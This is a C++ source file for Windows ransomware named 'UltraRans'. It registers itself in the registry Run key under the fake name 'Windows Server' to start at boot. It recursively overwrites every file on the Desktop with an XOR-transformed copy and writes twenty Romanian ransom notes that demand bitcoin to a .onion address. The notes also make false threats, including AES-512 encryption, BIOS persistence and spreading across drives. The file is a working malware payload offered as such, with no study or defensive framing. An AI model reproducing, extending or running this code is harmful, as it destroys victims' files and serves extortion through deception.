// UltraRans.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "UltraRans.h"
#define _WIN32_WINNT    0x0500
#define _WIN32_IE       0x0500
#define CSIDL_MYMUSIC   0x000D
#define CSIDL_MYVIDEO   0x000E

#define MAX_LOADSTRING 100
# include <iostream>
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <vector>
#include <cstring>  
# include "dirent.h"
# include <fstream>
# include "FileReader.h"
using namespace std;
long int max = 200000000;

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

												// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"Windows Server", szPathToExe, L"-foobar");
}


std::ifstream::pos_type filesize(const char* filename)
{
	std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
	return in.tellg();
}
void Criptare(string & path)
{
	char *buffer = NULL;
	int lenght = 0;
	buffer = _strdup(path.c_str());
	FileReader::CBinaryRead(buffer, lenght);

	buffer[lenght] = NULL;
	char*newBuffer;
	int new_lenght = 0;
	int i;
	char *aux = _strdup("@st@ 3 5ri9t@t yupyup");
	int tester_lenght = strlen(aux);
	int poz = tester_lenght;
	int contor = 0;
	if (buffer != NULL&&lenght > 0);
	{
		new_lenght = 2 * lenght + strlen("@st@ 3 5ri9t@t yupyup");
		newBuffer = new char[new_lenght + 1];
		strcpy(newBuffer, "@st@ 3 5ri9t@t yupyup");

		for (i = 0;i < tester_lenght;i++)
		{
			if (aux[i] == buffer[i])
				contor++;
		}
		if (contor == 21)
		{
			std::cout << "    sarit" << endl;
			return;
		}
		std::ofstream stergere;
		stergere.open(path);
		stergere << ' ';
		stergere.close();
		i = 0;
		while (i < lenght)
		{
			newBuffer[poz] = buffer[i] ^ 'f';
			newBuffer[poz + 1] = buffer[i];
			poz = poz + 2;
			i++;
		}
		newBuffer[new_lenght] = NULL;
		std::ofstream file;
		file.open(path.c_str(), std::ofstream::out | std::ofstream::binary);
		for (i = 0;i < new_lenght;i++)
		{
			file << newBuffer[i];
		}
		file.close();
		std::cout << "   criptat" << endl;
		delete newBuffer;
		delete buffer;
		delete aux;
	}
}
char* GetDesktopPath()
{
	char *path;
	path = new char[MAX_PATH + 1];
	if (SHGetSpecialFolderPathA(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE))
		return path;
	else
		return "ERROR";
}
void GetReqDirs(const std::string& path, const bool showHiddenDirs = false) {
	DIR *dpdf;
	struct dirent *epdf;
	dpdf = opendir(path.c_str());
	if (dpdf != NULL) {
		while ((epdf = readdir(dpdf)) != NULL) {
			if (showHiddenDirs ? (epdf->d_type == DT_DIR && string(epdf->d_name) != ".." && string(epdf->d_name) != ".") : (epdf->d_type == DT_DIR && strstr(epdf->d_name, "..") == NULL && strstr(epdf->d_name, ".") == NULL)) {
				GetReqDirs(path + "\\" + epdf->d_name, showHiddenDirs);
			}
			if (epdf->d_type == DT_REG)
			{
				//files.push_back(path + "\\"+epdf->d_name);
				string aux = path + "\\" + epdf->d_name;

				long int x = filesize(aux.c_str());
				if (x > 0 && x < max)
				{
					std::cout << aux.c_str();
					Criptare(aux);
				}
			}
		}
	}
	closedir(dpdf);
}
void Amenintare()
{
	//std::string mesaj;
	std::string path = GetDesktopPath();
	path += "\\";
	char mesaj[] = "******************************************************************************************\n\nSalut! Te anunt ca ai fost infectat cu noul ransomware TinKodeKKK!\n******************************************************************************************\n\nCiteste tot si nu te panica!\n\n\nAi luat acest virus prin intermediul facebook-ului, asa ca nu te panica!\n\n\nDa-mi voie sa iti explic ce se intampla. Toate fisierele tale sunt criptate\ncu o cheie AES 2 pe 512 biti. Ce inseamna asta ? Continutul fisierelor tale e\nok, doar ca tu nu poti sa il accesezi : -D.Nu te criza !Citeste tot si o sa\nvezi ce poti face !\n\nUrmatoarele actiuni sunt inutile:\n- copierea pe un mediu extern (doar vei extinde virusul : -) )\n- reinstalarea sistemului de operare !(acest malware este stocat in BIOS)\n- decriptarea prin bruteforce dureaza cam 4 quantilioane de ani pentru 1 MB;\n\nCe se va intampla mai departe ?\n- virusul s - a raspandit in partitiile secundare, daca incerci sa copiezi ce nu ti - a fost\ncriptat inca, doar vei raspandi virusul : -) (imi faci un bine, asa ca fa - o)\n- daca incerci sa iti reinstalezi sistemul de operare nu rezolvi nimic.Dupa 2 zile\nvirusul se reactiveaza;-)\n\n\nCum ai luat acest malware ?\n-de pe facebook. Esti una din multe victime, nu te amagi ca ai fi important :)\n\n\nSituatia pare disperata si parca nu ai cum sa scapi orice ai face, nu ? Stai linistit\nchiar asa e :-) Daca ai intelege notiunile acestea, ti-ai da seama ca e chiar mai grav :-)\n\n\nCe poti face ?\nE simplu ! Imi trimiti 5 monede bitcoin la adresa we35da5g6xew4gc.onion iar eu\no sa ma ocup de problema ta!\nAdresa aceasta este una de pe dark web\nCa sa o poti acesa instalezi OnionVPN\ndeschizi noul browser si scrii TORCH. Apoi Apesi butonul de OnionMail si incarci Hash-urile.\nDupa ce primesc monedele, eu o sa iti trimit inapoi (pe adresa pe care o vei crea)\ncheia privata de decriptare cu ajutorul careia o sa iti decriptezi fisierele, precum si\nun program ce va distruge acest malware :-)\n\n\nNu trebuie sa te grabesti. Adjudeca bine ce vrei sa faci. Nimeni nu te poate ajuta, nici politia\ndeoarece totul se face prin intermediul unei retele anonime. Fara cheia privata nu iti poti\nrecupera datele :-). Cum ziceam, nu te grabi, dar vezi ca pretul unui bitcoin creste\ncu aproximativ 2 dolari pe zi :-) Asa ca fa ce vrei!\nAstept pachetul ca sa iti livrez ceea ce ti se cuvine ;-)\nE vorba de bani, nu e nimic personal.\n******************************************************";
	char filen[] = "CITESTE DE URGENTA00!.txt";
	path += filen;
	char *filename = _strdup(path.c_str());
	int x = strlen(filename);
	x = x - 6;
	std::ofstream file;
	int i;
	for (i = 0;i <= 9;i++)
	{
		file.open(filename);
		file << mesaj;
		if (i != 9)
			filename[x]++;
		file.close();
	}
	filename[x] = '0';
	filename[x - 1]++;
	for (i = 0;i <= 9;i++)
	{
		file.open(filename);
		file << mesaj;
		if (i != 9)
			filename[x]++;
		file.close();
	}
	delete filename;
}

char *GetCurrentPath()
{
	TCHAR buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	wstring test(&buffer[0]);
	string test2(test.begin(), test.end());
	char *path = _strdup(test2.c_str());
	return path;
}
char * GetWinDirNot()
{
	TCHAR pf[MAX_PATH];
	SHGetSpecialFolderPath(
		0,
		pf,
		CSIDL_COMMON_MUSIC,
		FALSE);
	wstring test(&pf[0]);
	string test2(test.begin(), test.end());
	char *path = _strdup(test2.c_str());
	return path;
}











int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	RegisterProgram();
	IsMyProgramRegisteredForStartup(L"Windows Server");
	char *currentP = GetCurrentPath();
	char * defaultP = GetWinDirNot();
	string path = defaultP;
	GetReqDirs(GetDesktopPath());
	Amenintare();
	string drives[] = { "Q:","W:","E:", "R:", "T:", "Y:","U:", "I:","O:", "P:", "A:", "S:", "D:", "F:", "G:", "H:", "J:", "K:", "L:", "Z:", "X:", "V:", "B:", "N:", "M:" };
	/*int d_len = 25;
	for (int i = 0;i < d_len;i++)
		GetReqDirs(drives[i]);*/
	/*path += "\\index.txt";
	max = 200000000;
	std::ifstream file;
	file.open(path);
	if (!file.is_open())
	{
	std::ofstream g;
	g.open(path);
	g << 2;
	g.close();
	}
	else
	{
	int x;
	file >> x;
	if (x > 2)
	{
	std::ofstream g;
	g.open(path);
	g << 2;
	g.close();
	}
	if (x <= 0)
	{
	GetReqDirs(GetDesktopPath());
	Amenintare();
	/*string drives[] = { "Q:","W:","E:", "R:", "T:", "Y:","U:", "I:","O:", "P:", "A:", "S:", "D:", "F:", "G:", "H:", "J:", "K:", "L:", "Z:", "X:", "V:", "B:", "N:", "M:" };
	int d_len = 25;
	for (int i = 0;i < d_len;i++)
	GetReqDirs(drives[i]);
	}
	else
	{
	x--;
	std::ofstream g;
	g.open(path);
	g << x;
	g.close();
	}
	}*/


	return 0;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ULTRARANS));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_ULTRARANS);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_COMMAND:
	{
		int wmId = LOWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
	}
	break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code that uses hdc here...
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
